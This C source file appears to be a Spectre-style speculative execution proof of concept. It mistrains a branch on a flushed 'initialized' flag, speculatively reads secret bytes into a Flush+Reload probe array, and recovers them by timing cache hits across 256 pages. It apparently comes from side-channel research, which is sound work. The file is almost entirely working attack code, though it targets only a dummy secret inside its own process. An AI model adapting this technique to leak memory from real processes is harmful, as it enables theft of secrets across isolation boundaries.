#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 256
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1

#define DBG false


//int* i_global;
unsigned char* k_global;
//int* j_global;
//int* k_global;
cp_t* flush_reload_arr;

void victim_subfunc(unsigned char* i, int secret_index) {
    volatile cp_t cp = flush_reload_arr[i[secret_index]];
}

/*
 * Variables required in cache:
 *  i_global
 *  SECRET
 *
 * Variables requried in mem:
 *  initialized
 */
//training: initialize_index=0 print_index=0
//attack:   initialize_index=2 print_index={iterate through array i}
void victim_main_func(int initialize_index, int secret_index) {

    unsigned char* k = malloc(SECRET_SIZE);
    unsigned char* l = malloc(SECRET_SIZE);
    unsigned char* m = malloc(SECRET_SIZE);
    unsigned char** klm_addresses[3];
    klm_addresses[0] = &k;
    klm_addresses[1] = &l;
    klm_addresses[2] = &m;
    k_global = k;

    char initialized[3] __attribute__ ((aligned (256)));
    for(int i = 0; i < 3; i++) initialized[i] = false;  //all false

    for(int i = 0; i < SECRET_SIZE; i++) {
        unsigned char* klm_address = *klm_addresses[initialize_index];
        klm_address[i] = i;
    }
    initialized[initialize_index] = true;

    cpuid();
    flush((void*)&initialized[0]);
    cpuid();

    if(initialized[0]) {
        volatile cp_t cp = flush_reload_arr[k[secret_index]];
        //victim_subfunc(&i_j_k_addresses[0], secret_index);
    }
    free(k);
    free(l);
    free(m);
}
//printf("load initialized[0] = %d\n", time_mem_load((void*)&initialized[0]));

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
    int init_indices[n_accesses];
    int secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        init_indices[i] = 0;
        secret_indices[i] = 0;
    }
    init_indices[n_accesses-1] = 2;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        //if(DBG) printf("\n%d:\tinit %d\tsecret %d\n", i, init_indices[i], secret_indices[i]);
        victim_main_func(init_indices[i], secret_indices[i]);
        cpuid();
        if(init_indices[i] != 2) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    //results[0][0] = prepare(1);
    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    for(int i = 0; i < SECRET_SIZE; i++) {
        printf("0x%2x\t", k_global[i]);
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);


}
